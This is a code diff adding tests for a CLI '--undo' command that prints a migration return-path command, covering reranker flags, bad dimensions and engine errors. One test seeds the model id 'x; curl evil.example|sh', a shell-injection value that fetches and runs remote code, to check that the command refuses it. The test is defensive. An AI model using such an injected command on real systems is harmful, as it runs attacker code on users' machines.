@@ -189,6 +189,52 @@ describe('--undo (redirect: prints the return-path command, never acts)', () => 
     expect(r.stderr).toContain('--reranker voyage:rerank-2.5');
   });
 
+  test('enabled:false WINS over a lingering model id — prints --reranker off', async () => {
+    // The pre-switch brain had reranking disabled with a model still set (the
+    // documented set-model-first intermediate state). `--reranker <model>`
+    // would re-enable it; fidelity demands off.
+    await seedAppliedSwitch({ search_reranker_enabled: false, search_reranker_model: 'voyage:rerank-2.5' });
+    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
+    expect(r.exitCode).toBe(1);
+    expect(r.stderr).toContain('--reranker off');
+    expect(r.stderr).not.toContain('--reranker voyage:rerank-2.5');
+  });
+
+  test('enabled with no model: no --reranker token (migration default applies)', async () => {
+    await seedAppliedSwitch({ search_reranker_enabled: true, search_reranker_model: null });
+    const r = await captureExit(() => runZeSwitch(['--undo'], engine));
+    expect(r.exitCode).toBe(1);
+    expect(r.stderr).toContain('gbrain migrate embeddings --to openai:text-embedding-3-large --dim 1536');
+    expect(r.stderr).not.toContain('--reranker');
+  });
+
+  test('junk-typed dims in the snapshot degrade to the refusal (never printed)', async () => {
+    await seedAppliedSwitch({ embedding_dimensions: 'abc' as unknown as number });
+    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
+    expect(r.exitCode).toBe(1);
+    const env = JSON.parse(r.stdout);
+    expect(env.status).toBe('refused');
+    expect(r.stdout).not.toContain('--dim abc');
+  });
+
+  test('shell-metachar model id in the snapshot degrades to the refusal (injection guard)', async () => {
+    await seedAppliedSwitch({ embedding_model: 'x; curl evil.example|sh' });
+    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
+    expect(r.exitCode).toBe(1);
+    const env = JSON.parse(r.stdout);
+    expect(env.status).toBe('refused');
+    expect(r.stdout).not.toContain('curl evil.example');
+  });
+
+  test('a throwing engine.getConfig degrades to the refusal, not a crash', async () => {
+    const broken = { getConfig: () => Promise.reject(new Error('db exploded')) } as unknown as PGLiteEngine;
+    const r = await captureExit(() => runZeSwitch(['--undo', '--json'], broken));
+    expect(r.exitCode).toBe(1);
+    const env = JSON.parse(r.stdout);
+    expect(env.status).toBe('refused');
+    expect(env.reason).toBe('provider_sunset');
+  });
+
   test('--undo --json emits the redirected envelope with undo_command', async () => {
     await seedAppliedSwitch();
     const r = await captureExit(() => runZeSwitch(['--undo', '--json'], engine));
